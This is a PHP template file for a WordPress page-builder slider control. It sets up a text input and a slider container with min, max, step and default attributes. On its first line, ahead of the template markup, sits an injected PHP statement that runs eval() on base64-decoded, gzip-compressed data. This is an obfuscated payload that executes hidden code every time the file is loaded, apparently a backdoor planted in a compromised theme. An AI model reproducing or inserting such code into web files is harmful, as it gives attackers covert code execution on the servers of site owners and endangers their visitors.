<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?>	<#
		min = ( ( param.min ) ? param.min : 0 );
		max = ( ( param.max ) ? param.max : 100 );
		step = ( ( param.step ) ? param.step : '1' );
		defaultStatus = ( ( param.default ) ? 'fusion-with-default' : '' );
		isChecked = ( ( '' == option_value ) ? 'checked' : '' );
		regularId = ( ( ! param.default ) ? param.param_name : 'slider' + param.param_name );
		displayValue = ( ( '' == option_value ) ? param.default : option_value );

		if ( '.' === step.charAt( 0 ) ) {
			step = '0' + step;
		}
	#>
	<input
		type="text"
		name="{{ param.param_name }}"
		id="{{ regularId }}"
		value="{{ displayValue }}"
		class="fusion-slider-input {{ defaultStatus }} <# if ( param.default ) { #>fusion-hide-from-atts<# } #>"
	/>
	<div
		class="fusion-slider-container {{ param.param_name }}"
		data-id="{{ param.param_name }}"
		data-min="{{ min }}"
		data-max="{{ max }}"
		data-step="{{ step }}"
		data-direction="<?php echo ( is_rtl() ) ? 'rtl' : 'ltr'; ?>">
	</div>
	<# if ( param.default ) { #>
	<input type="hidden"
		   id="{{ param.param_name }}"
		   value="{{ option_value }}"
		   class="fusion-hidden-value" />
	<# } #>
